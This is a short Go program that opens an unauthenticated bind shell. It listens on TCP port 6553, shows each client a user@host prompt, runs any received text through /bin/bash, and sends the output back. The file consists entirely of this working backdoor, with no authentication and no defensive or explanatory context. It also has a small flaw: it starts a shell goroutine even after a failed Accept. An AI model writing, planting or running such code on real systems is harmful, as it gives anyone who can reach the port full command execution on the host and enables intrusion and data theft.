package main

import "fmt"
import "net"
import "os"
import "os/exec"
import "os/user"

const PORT = "6553"
const PROTOCOL = "tcp"

// type connection struct {
//	 protocol string
//	 port int
// }

func handleError(err error) int {
	if err != nil {
		fmt.Printf("❌ Error: %v\n", err)
		return 1
	}
	return 0
}

func getUpdatedDirectory() string {
	cwd, _ := os.Getwd()
	return cwd
}

func spawnShell(conn net.Conn) {
	currentUser, err := user.Current()
	if handleError(err) == 1 {
		return
	}
	username := currentUser.Username
	hostname, err := os.Hostname()
	if handleError(err) == 1 {
		return
	}

	fmt.Printf("\n🟢 Received connection from %v", conn.RemoteAddr().String())
	conn.Write([]byte("\n🦊 Connection established!"))

	for {
		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, getUpdatedDirectory())
		conn.Write([]byte(prompt))
		input := make([]byte, 1024)
		n, err := conn.Read(input)
		if handleError(err) == 1 {
			fmt.Printf("\n🔴 Error reading input from client: %v\n", err)
			return
		}

		cmd := exec.Command("/bin/bash", "-c", string(input[:n]))
		cmd.Stdout = conn
		cmd.Stderr = conn
		if err := cmd.Run(); handleError(err) == 1 {
			fmt.Fprintf(conn, "\n🔴 Error executing command: %v", err)
		}
	}
}

func listen(PORT string, PROTOCOL string) {
	ln, err := net.Listen(PROTOCOL, ":"+PORT)
	if handleError(err) == 1 {
		fmt.Printf("\n❌ An error has occurred with listening: %v", err)
		return
	} else {
		fmt.Printf("\n🟡 Listening on %s:%s...", PROTOCOL, PORT)
	}

	for {
		conn, err := ln.Accept()
		if handleError(err) == 1 {
			fmt.Printf("\n🔴 An error occurred during an attempted connection: %v", err)
		} else {
			fmt.Printf("\n🟢 Connection established")
		}
		go spawnShell(conn)
	}
}

func main() {
	listen(PORT, PROTOCOL)
}
